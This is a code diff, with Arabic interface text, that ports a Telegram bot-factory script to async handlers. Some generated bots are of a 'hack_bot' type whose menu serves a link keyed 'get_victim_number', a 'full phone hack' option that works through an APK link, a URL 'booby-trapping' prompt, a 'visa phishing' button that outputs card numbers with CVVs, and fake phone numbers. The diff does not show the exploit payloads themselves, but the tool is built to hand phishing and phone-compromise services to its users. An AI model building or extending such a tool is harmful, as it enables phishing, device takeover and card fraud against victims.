@@ -1236,25 +1104,24 @@ def start_made_bot(update: Update, context: CallbackContext):
         if bot_settings["notifications"] == "on" and user_id != admin_id:
             user_name = update.effective_user.first_name
             username = update.effective_user.username or "غير متاح"
-            send_message(context.bot, admin_id,
-                         f"🔔 عضو جديد!\nالاسم: {user_name}\nالمعرف: @{username}\nالايدي: {user_id}\nالعدد الكلي: {len(members)}",
-                         parse_mode=ParseMode.MARKDOWN)
+            await send_msg(context.bot, admin_id,
+                         f"🔔 عضو جديد!\nالاسم: {user_name}\nالمعرف: @{username}\nالايدي: {user_id}\nالعدد: {len(members)}")
 
     if user_id == admin_id:
-        send_message(context.bot, chat_id,
-                     "مرحبًا! إليك أوامرك:",
+        await send_msg(context.bot, chat_id, "مرحبًا! إليك أوامرك:",
                      reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
 
     if bot_type == "encryption_bot":
         user_name = update.effective_user.first_name
         user_username = update.effective_user.username or "غير متاح"
-        welcome = f"مرحباً {user_name}!\nيوزر: @{user_username}\nايدي: {user_id}\n\nمرحبا بك في عالم فك/التشفير"
-        send_message(context.bot, chat_id, welcome, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
+        await send_msg(context.bot, chat_id,
+                     f"مرحباً {user_name}!\nيوزر: @{user_username}\nايدي: {user_id}\n\nمرحبا بك في عالم فك/التشفير",
+                     reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
     elif bot_type == "factory_bot":
-        send_message(context.bot, chat_id, "حياك الله في بوت صانع البوتات",
+        await send_msg(context.bot, chat_id, "حياك الله في بوت صانع البوتات",
                      reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
     else:
-        send_message(context.bot, chat_id, bot_settings["start_message"],
+        await send_msg(context.bot, chat_id, bot_settings["start_message"],
                      parse_mode=ParseMode.MARKDOWN,
                      reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
 
@@ -1263,10 +1130,10 @@ def start_made_bot(update: Update, context: CallbackContext):
 # handle_callback_query_made_bot
 # =============================================
 
-def handle_callback_query_made_bot(update: Update, context: CallbackContext):
+async def handle_callback_query_made_bot(update: Update, context: CallbackContext):
     query = update.callback_query
     if not query.message:
-        query.answer("حدث خطأ.", show_alert=True)
+        await query.answer("حدث خطأ.", show_alert=True)
         return
 
     user_id = query.from_user.id
@@ -1277,7 +1144,7 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
     current_bot_username = get_bot_username_from_token(current_bot_token)
 
     if not current_bot_username:
-        query.answer("حدث خطأ.", show_alert=True)
+        await query.answer("حدث خطأ.", show_alert=True)
         return
 
     admin_id = get_bot_admin_id(current_bot_username)
@@ -1296,13 +1163,13 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
 
     if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
         if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
-            msg = f"❌ يجب الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
+            msg = f"يجب الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
             keyboard = [[InlineKeyboardButton("اشترك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
             try:
-                edit_message_text(context.bot, chat_id, message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
+                await edit_msg(context.bot, chat_id, message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
             except:
-                send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
-            query.answer("اشترك أولاً.", show_alert=True)
+                await send_msg(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
+            await query.answer("اشترك أولاً.", show_alert=True)
             return
 
     links = {
@@ -1323,97 +1190,77 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
         "get_victim_number": "https://tubular-brioche-55433f.netlify.app/",
     }
 
-    query.answer()
+    await query.answer()
 
-    # العودة للقائمة الرئيسية
     if data == "back_to_main_user_menu":
         bot_user_states[current_bot_username][user_id] = None
         if bot_type == "factory_bot":
-            send_message(context.bot, chat_id, "اختر نوع البوت:",
+            await send_msg(context.bot, chat_id, "اختر نوع البوت:",
                          reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
         elif bot_type == "encryption_bot":
-            user_name = update.effective_user.first_name
-            send_message(context.bot, chat_id, f"مرحباً {user_name}!\nمرحبا بك في عالم فك/التشفير",
+            await send_msg(context.bot, chat_id, f"مرحبا بك في عالم فك/التشفير",
                          reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
         else:
-            send_message(context.bot, chat_id, bot_settings["start_message"],
+            await send_msg(context.bot, chat_id, bot_settings["start_message"],
                          parse_mode=ParseMode.MARKDOWN,
                          reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
         return
 
-    # الروابط المباشرة (hack_bot)
     if data in links and bot_type == "hack_bot":
-        send_message(context.bot, chat_id, f"🔗 {links[data]}")
+        await send_msg(context.bot, chat_id, f"🔗 {links[data]}")
         return
 
-    # أزرار hack_bot
     if bot_type == "hack_bot":
         if data == "user_button_ai":
             bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
-            send_message(context.bot, chat_id, "📝 أرسل سؤالك للذكاء الاصطناعي:")
+            await send_msg(context.bot, chat_id, "أرسل سؤالك للذكاء الاصطناعي:")
             return
         elif data == "user_button_dream_interpret":
             bot_user_states[current_bot_username][user_id] = {"action": "await_dream_text"}
-            send_message(context.bot, chat_id, "📝 أرسل حلمك لتفسيره:")
+            await send_msg(context.bot, chat_id, "أرسل حلمك:")
             return
         elif data == "user_button_blue_genie_game":
             bot_user_states[current_bot_username][user_id] = {"action": "await_genie_question"}
-            send_message(context.bot, chat_id, "📝 اسأل المارد الأزرق:")
+            await send_msg(context.bot, chat_id, "اسأل المارد:")
             return
         elif data == "user_button_image_search":
             bot_user_states[current_bot_username][user_id] = {"action": "await_image_prompt"}
-            send_message(context.bot, chat_id, "📝 أرسل وصف الصورة:")
+            await send_msg(context.bot, chat_id, "أرسل وصف الصورة:")
             return
         elif data == "user_button_text_to_speech":
             bot_user_states[current_bot_username][user_id] = {"action": "await_tts_text"}
-            send_message(context.bot, chat_id, "📝 أرسل النص لتحويله إلى صوت:")
+            await send_msg(context.bot, chat_id, "أرسل النص:")
             return
         elif data == "user_button_azkar":
             azkar = get_azkar_via_api(current_bot_username, user_id)
-            send_message(context.bot, chat_id, azkar, parse_mode=ParseMode.MARKDOWN)
+            await send_msg(context.bot, chat_id, azkar, parse_mode=ParseMode.MARKDOWN)
             return
-        elif data == "user_button_shereen_ai":
+        elif data in ["user_button_shereen_ai", "user_button_deepseek_ai", "user_button_chatgpt_3_5"]:
             bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
-            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
-            return
-        elif data == "user_button_deepseek_ai":
-            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
-            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
-            return
-        elif data == "user_button_chatgpt_3_5":
-            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
-            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
+            await send_msg(context.bot, chat_id, "أرسل سؤالك:")
             return
         elif data == "user_button_full_phone_hack":
-            send_message(context.bot, chat_id, "اختر العملية:",
-                         reply_markup=get_full_phone_hack_keyboard(current_bot_username, user_id))
-            return
-        elif data == "user_button_link_exploit":
-            send_message(context.bot, chat_id, "🔗 أرسل الرابط المراد تلغيمه:")
-            return
-        elif data == "user_button_smart_game":
-            send_message(context.bot, chat_id, "🧠 اللعبة قيد التطوير.")
+            await send_msg(context.bot, chat_id, "اختر العملية:", reply_markup=get_full_phone_hack_keyboard())
             return
         elif data == "user_button_fake_numbers":
             fake = generate_fake_number_details()
-            msg = f"📞 الرقم: {fake['phone_number']}\n🌍 الدولة: {fake['country']}\n📱 المنصة: {fake['platform']}\n📅 تاريخ الإنشاء: {fake['creation_date']}"
-            send_message(context.bot, chat_id, msg,
-                         reply_markup=get_fake_number_keyboard(current_bot_username, user_id))
+            msg = f"📞 الرقم: {fake['phone_number']}\n🌍 الدولة: {fake['country']}\n📱 المنصة: {fake['platform']}\n📅 التاريخ: {fake['creation_date']}"
+            await send_msg(context.bot, chat_id, msg, reply_markup=get_fake_number_keyboard())
             return
         elif data == "user_button_visa_phishing":
             visa = generate_random_visa_details()
             msg = f"💳 رقم البطاقة: {visa['card_number']}\n📅 الانتهاء: {visa['expiry']}\n🔐 CVV: {visa['cvv']}\n🏦 البنك: {visa['bank']}\n📋 النوع: {visa['card_type']}\n🌍 الدولة: {visa['country']}\n💰 القيمة: {visa['value']}"
-            send_message(context.bot, chat_id, msg)
+            await send_msg(context.bot, chat_id, msg)
             return
         elif data == "user_button_radio_hack":
             msg = "📻 محطات الراديو:\n\n"
             for station in SUDAN_RADIO_STATIONS + EGYPT_RADIO_STATIONS[:5]:
                 msg += f"🎵 {station['name']}: {station['url']}\n"
-            send_message(context.bot, chat_id, msg)
+            await send_msg(context.bot, chat_id, msg)
             return
         elif data == "user_button_link_check":
             bot_user_states[current_bot_username][user_id] = {"action": "await_url_to_check"}
-            send_message(context.bot, chat_id, "📝 أرسل الرابط لفحصه:")
+            await send_msg(context.bot, chat_id, "أرسل الرابط لفحصه:")
             return
         elif data == "user_button_name_decorate":
             keyboard = [
@@ -1421,15 +1268,15 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
                 [InlineKeyboardButton("🇸🇦 اسم عربي", callback_data="decorate_arabic")],
                 [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
             ]
-            send_message(context.bot, chat_id, "اختر نوع الاسم:", reply_markup=InlineKeyboardMarkup(keyboard))
+            await send_msg(context.bot, chat_id, "اختر نوع الاسم:", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         elif data == "decorate_english":
             bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "english"}
-            send_message(context.bot, chat_id, "📝 أرسل الاسم بالإنجليزية:")
+            await send_msg(context.bot, chat_id, "أرسل الاسم بالإنجليزية:")
             return
         elif data == "decorate_arabic":
             bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "arabic"}
-            send_message(context.bot, chat_id, "📝 أرسل الاسم بالعربية:")
+            await send_msg(context.bot, chat_id, "أرسل الاسم بالعربية:")
             return
         elif data == "telegram_usernames_menu":
             keyboard = [
@@ -1441,11 +1288,11 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
                 [InlineKeyboardButton("فريد", callback_data="get_username_unique")],
                 [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
             ]
-            edit_message_text(context.bot, chat_id, message_id, "اختر نوع اليوزر:", reply_markup=InlineKeyboardMarkup(keyboard))
+            await edit_msg(context.bot, chat_id, message_id, "اختر نوع اليوزر:", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         elif data.startswith("get_username_"):
             username_type = data.replace("get_username_", "")
-            query.answer("جاري البحث...", show_alert=True)
+            await query.answer("جاري البحث...", show_alert=True)
             found = []
             for i in range(5):
                 username = generate_and_check_username(current_bot_token, username_type)
@@ -1454,212 +1301,199 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
                 else:
                     break
             if found:
-                msg = "✅ تم العثور على:\n\n" + "\n".join(f"✨ @{u}" for u in found)
-                send_message(context.bot, chat_id, msg)
+                msg = "تم العثور على:\n\n" + "\n".join(f"✨ @{u}" for u in found)
+                await send_msg(context.bot, chat_id, msg)
             else:
-                send_message(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة.")
+                await send_msg(context.bot, chat_id, "لم يتم العثور على يوزرات.")
             return
         elif data.startswith("full_phone_hack_"):
-            send_message(context.bot, chat_id, "⏳ جاري المعالجة...\nهذه الميزة تعمل على الهاتف المستهدف عبر رابط APK.")
+            await send_msg(context.bot, chat_id, "هذه الميزة تعمل عبر رابط APK.")
+            return
+        elif data == "user_button_link_exploit":
+            await send_msg(context.bot, chat_id, "أرسل الرابط المراد تلغيمه:")
+            return
+        elif data == "user_button_smart_game":
+            await send_msg(context.bot, chat_id, "اللعبة قيد التطوير.")
             return
 
-    # أزرار الأدمن في البوتات المصنوعة
     if user_id == admin_id:
         if data == "m1":
-            members_count = len(bot_settings.get("members", []))
-            send_message(context.bot, chat_id, f"👥 عدد المشتركون: {members_count}")
+            await send_msg(context.bot, chat_id, f"👥 عدد المشتركون: {len(bot_settings.get('members', []))}")
             return
         elif data == "send":
             bot_user_states[current_bot_username][user_id] = {"action": "await_broadcast_message"}
-            send_message(context.bot, chat_id, "📝 أرسل الرسالة للإذاعة:")
-            return
-        elif data == "forward":
-            send_message(context.bot, chat_id, "📝 أرسل الرسالة الموجهة:")
+            await send_msg(context.bot, chat_id, "أرسل الرسالة للإذاعة:")
             return
         elif data == "ach":
             bot_user_states[current_bot_username][user_id] = {"action": "await_channel_for_subscription"}
-            send_message(context.bot, chat_id, "📝 أرسل معرف القناة:")
+            await send_msg(context.bot, chat_id, "أرسل معرف القناة:")
             return
         elif data == "dch":
             if bot_settings["channels"]:
-                keyboard = []
-                for ch in bot_settings["channels"]:
-                    keyboard.append([InlineKeyboardButton(f"🗑 {ch}", callback_data=f"remove_ch_{ch}")])
+                keyboard = [[InlineKeyboardButton(f"🗑 {ch}", callback_data=f"remove_ch_{ch}")] for ch in bot_settings["channels"]]
                 keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
-                send_message(context.bot, chat_id, "اختر القناة للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
+                await send_msg(context.bot, chat_id, "اختر القناة:", reply_markup=InlineKeyboardMarkup(keyboard))
             else:
-                send_message(context.bot, chat_id, "لا توجد قنوات إجبارية.")
+                await send_msg(context.bot, chat_id, "لا توجد قنوات.")
             return
         elif data.startswith("remove_ch_"):
             ch_to_remove = data.replace("remove_ch_", "")
             if ch_to_remove in bot_settings["channels"]:
                 bot_settings["channels"].remove(ch_to_remove)
                 save_made_bot_settings(current_bot_username)
-                send_message(context.bot, chat_id, f"✅ تم حذف {ch_to_remove}")
+                await send_msg(context.bot, chat_id, f"تم حذف {ch_to_remove}")
             return
         elif data == "back_to_admin":
-            send_message(context.bot, chat_id, "لوحة التحكم:", reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
+            await send_msg(context.bot, chat_id, "لوحة التحكم:", reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
             return
         elif data == "ons":
             bot_settings["notifications"] = "on"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تفعيل التنبيهات.")
+            await send_msg(context.bot, chat_id, "تم تفعيل التنبيهات.")
             return
         elif data == "ofs":
             bot_settings["notifications"] = "off"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تعطيل التنبيهات.")
+            await send_msg(context.bot, chat_id, "تم تعطيل التنبيهات.")
             return
         elif data == "obot":
             bot_settings["bot_status"] = "on"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم فتح البوت.")
+            await send_msg(context.bot, chat_id, "تم فتح البوت.")
             return
         elif data == "ofbot":
             bot_settings["bot_status"] = "off"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم إيقاف البوت.")
+            await send_msg(context.bot, chat_id, "تم إيقاف البوت.")
             return
         elif data == "pro":
             bot_settings["payment_status"] = "on"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تفعيل الوضع المدفوع.")
+            await send_msg(context.bot, chat_id, "تم تفعيل الوضع المدفوع.")
             return
         elif data == "frre":
             bot_settings["payment_status"] = "free"
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تفعيل الوضع المجاني.")
+            await send_msg(context.bot, chat_id, "تم تفعيل الوضع المجاني.")
             return
         elif data == "pro123":
             bot_user_states[current_bot_username][user_id] = {"action": "await_paid_user_id"}
-            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
+            await send_msg(context.bot, chat_id, "أرسل معرف المستخدم:")
             return
         elif data == "frre123":
             bot_user_states[current_bot_username][user_id] = {"action": "await_remove_paid_user_id"}
-            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
+            await send_msg(context.bot, chat_id, "أرسل معرف المستخدم:")
             return
         elif data == "ban":
             bot_user_states[current_bot_username][user_id] = {"action": "await_ban_user_id"}
-            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم للحظر:")
+            await send_msg(context.bot, chat_id, "أرسل معرف المستخدم للحظر:")
             return
         elif data == "unban":
             bot_user_states[current_bot_username][user_id] = {"action": "await_unban_user_id"}
-            send_message(context.bot, chat_id, "📝 أرسل معرف المستخدم لإلغاء الحظر:")
+            await send_msg(context.bot, chat_id, "أرسل معرف المستخدم:")
             return
         elif data == "set_start_message":
             bot_user_states[current_bot_username][user_id] = {"action": "await_new_start_message"}
-            send_message(context.bot, chat_id, "📝 أرسل رسالة البدء الجديدة:")
+            await send_msg(context.bot, chat_id, "أرسل رسالة البدء الجديدة:")
             return
         elif data == "download_bot_data":
             settings_file = get_made_bot_data_path(current_bot_username)
             if os.path.exists(settings_file):
                 with open(settings_file, 'rb') as f:
-                    context.bot.send_document(chat_id=chat_id, document=f, filename=f"{current_bot_username}_settings.json")
+                    await context.bot.send_document(chat_id=chat_id, document=f, filename=f"{current_bot_username}_settings.json")
             return
         elif data == "set_payload_points":
             bot_user_states[current_bot_username][user_id] = {"action": "await_payload_points"}
-            send_message(context.bot, chat_id, "📝 أرسل عدد النقاط المطلوبة:")
+            await send_msg(context.bot, chat_id, "أرسل عدد النقاط:")
             return
         elif data == "set_main_channel_link":
             bot_user_states[current_bot_username][user_id] = {"action": "await_channel_name_for_link"}
-            send_message(context.bot, chat_id, "📝 أرسل رابط القناة الأساسية:")
+            await send_msg(context.bot, chat_id, "أرسل رابط القناة:")
             return
         elif data == "buttons_panel":
             keyboard = [
                 [InlineKeyboardButton("➕ إضافة زر", callback_data="add_custom_button")],
                 [InlineKeyboardButton("🗑 حذف زر", callback_data="remove_custom_button")],
-                [InlineKeyboardButton("✅ تفعيل الأزرار", callback_data="enable_custom_buttons")],
-                [InlineKeyboardButton("❌ تعطيل الأزرار", callback_data="disable_custom_buttons")],
+                [InlineKeyboardButton("✅ تفعيل", callback_data="enable_custom_buttons")],
+                [InlineKeyboardButton("❌ تعطيل", callback_data="disable_custom_buttons")],
                 [InlineKeyboardButton("رجوع", callback_data="back_to_admin")]
             ]
-            send_message(context.bot, chat_id, "إدارة الأزرار:", reply_markup=InlineKeyboardMarkup(keyboard))
+            await send_msg(context.bot, chat_id, "إدارة الأزرار:", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         elif data == "add_custom_button":
             bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_name"}
-            send_message(context.bot, chat_id, "📝 أرسل اسم الزر:")
+            await send_msg(context.bot, chat_id, "أرسل اسم الزر:")
             return
         elif data == "enable_custom_buttons":
             bot_settings["custom_buttons_enabled_by_admin"] = True
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تفعيل الأزرار المخصصة.")
+            await send_msg(context.bot, chat_id, "تم تفعيل الأزرار.")
             return
         elif data == "disable_custom_buttons":
             bot_settings["custom_buttons_enabled_by_admin"] = False
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تعطيل الأزرار المخصصة.")
+            await send_msg(context.bot, chat_id, "تم تعطيل الأزرار.")
             return
         elif data == "remove_custom_button":
             if bot_settings["custom_buttons"]:
-                keyboard = []
-                for i, btn in enumerate(bot_settings["custom_buttons"]):
-                    keyboard.append([InlineKeyboardButton(f"🗑 {btn['name']}", callback_data=f"del_custom_btn_{i}")])
+                keyboard = [[InlineKeyboardButton(f"🗑 {btn['name']}", callback_data=f"del_custom_btn_{i}")] for i, btn in enumerate(bot_settings["custom_buttons"])]
                 keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
-                send_message(context.bot, chat_id, "اختر الزر للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
+                await send_msg(context.bot, chat_id, "اختر الزر:", reply_markup=InlineKeyboardMarkup(keyboard))
             else:
-                send_message(context.bot, chat_id, "لا توجد أزرار مخصصة.")
+                await send_msg(context.bot, chat_id, "لا توجد أزرار.")
             return
         elif data.startswith("del_custom_btn_"):
             idx = int(data.replace("del_custom_btn_", ""))
             if 0 <= idx < len(bot_settings["custom_buttons"]):
                 removed = bot_settings["custom_buttons"].pop(idx)
                 save_made_bot_settings(current_bot_username)
-                send_message(context.bot, chat_id, f"✅ تم حذف الزر '{removed['name']}'.")
+                await send_msg(context.bot, chat_id, f"تم حذف '{removed['name']}'.")
             return
 
-    # أزرار التشفير
     if bot_type == "encryption_bot":
         if data == "encrypt_file":
-            edit_message_text(context.bot, chat_id, message_id, "اختر نوع التشفير:", reply_markup=get_encryption_types_keyboard())
+            await edit_msg(context.bot, chat_id, message_id, "اختر نوع التشفير:", reply_markup=get_encryption_types_keyboard())
             bot_user_states[current_bot_username][user_id] = "await_encryption_type"
             return
         elif data == "decrypt_file":
-            edit_message_text(context.bot, chat_id, message_id, "اختر نوع فك التشفير:", reply_markup=get_encryption_types_keyboard())
+            await edit_msg(context.bot, chat_id, message_id, "اختر نوع فك التشفير:", reply_markup=get_encryption_types_keyboard())
             bot_user_states[current_bot_username][user_id] = "await_decryption_type"
             return
         elif data.startswith("enc_type_"):
             enc_type = data.replace("enc_type_", "")
             current_state = bot_user_states[current_bot_username].get(user_id)
             if current_state == "await_encryption_type":
-                send_message(context.bot, chat_id, f"📤 أرسل الملف لتشفيره بـ {enc_type}:")
+                await send_msg(context.bot, chat_id, f"أرسل الملف لتشفيره بـ {enc_type}:")
                 bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_encryption", "type": enc_type}
             elif current_state == "await_decryption_type":
-                send_message(context.bot, chat_id, f"📤 أرسل الملف لفك تشفيره بـ {enc_type}:")
+                await send_msg(context.bot, chat_id, f"أرسل الملف لفك تشفيره بـ {enc_type}:")
                 bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_decryption", "type": enc_type}
             return
         elif data == "show_terms_encryption_bot":
-            terms = (
-                "📜 *الشروط والمتطلبات:*\n\n"
-                "1. البوت مصمم لأغراض تعليمية.\n"
-                "2. SHA256 لا يمكن فك تشفيره.\n"
-                "3. يجب استخدام نفس نوع التشفير لفكه.\n"
-                "4. يدعم الملفات النصية فقط.\n"
-                "5. للدعم تواصل مع المطور."
-            )
-            edit_message_text(context.bot, chat_id, message_id, terms, parse_mode=ParseMode.MARKDOWN,
-                              reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_to_main_encryption_menu")]]))
+            terms = "📜 الشروط:\n\n1. البوت لأغراض تعليمية.\n2. SHA256 لا يمكن فكه.\n3. يدعم الملفات النصية فقط.\n4. للدعم تواصل مع المطور."
+            await edit_msg(context.bot, chat_id, message_id, terms,
+                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_to_main_encryption_menu")]]))
             return
         elif data == "back_to_main_encryption_menu":
             bot_user_states[current_bot_username][user_id] = None
-            user_name = update.effective_user.first_name
-            send_message(context.bot, chat_id, f"مرحباً {user_name}!\nمرحبا بك في عالم فك/التشفير",
+            await send_msg(context.bot, chat_id, "مرحبا بك في عالم فك/التشفير",
                          reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
             return
 
-    # أزرار المصنع الفرعي
     if bot_type == "factory_bot":
         if data == "create_bot_from_factory":
             keyboard = [
                 [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
                 [InlineKeyboardButton("🔐 بوت تشفير", callback_data="create_encryption_bot_sub")]
             ]
-            edit_message_text(context.bot, chat_id, message_id, "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
+            await edit_msg(context.bot, chat_id, message_id, "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         elif data == "create_hack_bot_sub":
-            edit_message_text(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
+            await edit_msg(context.bot, chat_id, message_id, "أرسل توكن البوت:")
             bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "hack_bot"}
             return
         elif data == "create_encryption_bot_sub":
-            edit_message_text(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
+            await edit_msg(context.bot, chat_id, message_id, "أرسل توكن البوت:")
             bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "encryption_bot"}
             return
 
@@ -1668,7 +1502,7 @@ def handle_callback_query_made_bot(update: Update, context: CallbackContext):
 # handle_message_made_bot
 # =============================================
 
-def handle_message_made_bot(update: Update, context: CallbackContext):
+async def handle_message_made_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     text = update.message.text.strip()
@@ -1690,79 +1524,70 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
     state = bot_user_states[current_bot_username].get(user_id)
 
     if isinstance(state, dict) and state.get("action") == "await_image_prompt":
-        send_message(context.bot, chat_id, "⏳ جاري إنشاء الصورة...")
+        await send_msg(context.bot, chat_id, "جاري إنشاء الصورة...")
         image_url = generate_image_via_api(text, current_bot_username, user_id)
-        if image_url:
-            send_message(context.bot, chat_id, image_url)
-        else:
-            send_message(context.bot, chat_id, "❌ فشل إنشاء الصورة.")
+        await send_msg(context.bot, chat_id, image_url if image_url else "فشل إنشاء الصورة.")
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_tts_text":
-        send_message(context.bot, chat_id, "⏳ جاري التحويل...")
+        await send_msg(context.bot, chat_id, "جاري التحويل...")
         audio_url = convert_text_to_speech_via_api(text, current_bot_username, user_id)
-        if audio_url:
-            send_message(context.bot, chat_id, audio_url)
-        else:
-            send_message(context.bot, chat_id, "❌ فشل التحويل.")
+        await send_msg(context.bot, chat_id, audio_url if audio_url else "فشل التحويل.")
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_ai_prompt":
-        send_message(context.bot, chat_id, "⏳ جاري المعالجة...")
+        await send_msg(context.bot, chat_id, "جاري المعالجة...")
         response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
-        send_message(context.bot, chat_id, response or "❌ فشل المعالجة.")
+        await send_msg(context.bot, chat_id, response)
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_dream_text":
-        send_message(context.bot, chat_id, "⏳ جاري التفسير...")
+        await send_msg(context.bot, chat_id, "جاري التفسير...")
         response = interact_with_ai_api(text, "dream_interpret", current_bot_username, user_id)
-        send_message(context.bot, chat_id, response or "❌ فشل التفسير.")
+        await send_msg(context.bot, chat_id, response)
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_genie_question":
-        send_message(context.bot, chat_id, "⏳ المارد يفكر...")
+        await send_msg(context.bot, chat_id, "المارد يفكر...")
         response = interact_with_ai_api(text, "blue_genie_game", current_bot_username, user_id)
-        send_message(context.bot, chat_id, response or "❌ فشل المارد.")
+        await send_msg(context.bot, chat_id, response)
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_name_to_decorate":
         name_type = state.get("name_type", "english")
-        if name_type == "english":
-            decorated = decorate_english_name(text)
-        else:
-            decorated = decorate_arabic_name(text)
-        send_message(context.bot, chat_id, decorated)
+        decorated = decorate_english_name(text) if name_type == "english" else decorate_arabic_name(text)
+        await send_msg(context.bot, chat_id, decorated)
         bot_user_states[current_bot_username][user_id] = None
         return
 
     if isinstance(state, dict) and state.get("action") == "await_url_to_check":
-        check_url_virustotal(update, context, text, current_bot_username, user_id)
+        result_msg, error_msg = check_url_virustotal_data(text)
+        await send_msg(context.bot, chat_id, result_msg or error_msg, parse_mode=ParseMode.MARKDOWN if result_msg else None)
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # أزرار الأدمن
     if user_id == admin_id:
         if isinstance(state, dict) and state.get("action") == "await_broadcast_message":
             sent_count = 0
             for member_id in bot_settings.get("members", []):
                 try:
-                    send_message(context.bot, member_id, text)
+                    await context.bot.send_message(chat_id=member_id, text=text)
                     sent_count += 1
                 except:
                     pass
-            send_message(context.bot, chat_id, f"✅ تم الإذاعة إلى {sent_count} عضو.")
+            await send_msg(context.bot, chat_id, f"تم الإذاعة إلى {sent_count} عضو.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
         if isinstance(state, dict) and state.get("action") == "await_new_start_message":
             bot_settings["start_message"] = text
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تحديث رسالة البدء.")
+            await send_msg(context.bot, chat_id, "تم تحديث رسالة البدء.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1771,9 +1596,9 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
             if channel not in bot_settings["channels"]:
                 bot_settings["channels"].append(channel)
                 save_made_bot_settings(current_bot_username)
-                send_message(context.bot, chat_id, f"✅ تم إضافة {channel}.")
+                await send_msg(context.bot, chat_id, f"تم إضافة {channel}.")
             else:
-                send_message(context.bot, chat_id, "ℹ️ مضافة بالفعل.")
+                await send_msg(context.bot, chat_id, "مضافة بالفعل.")
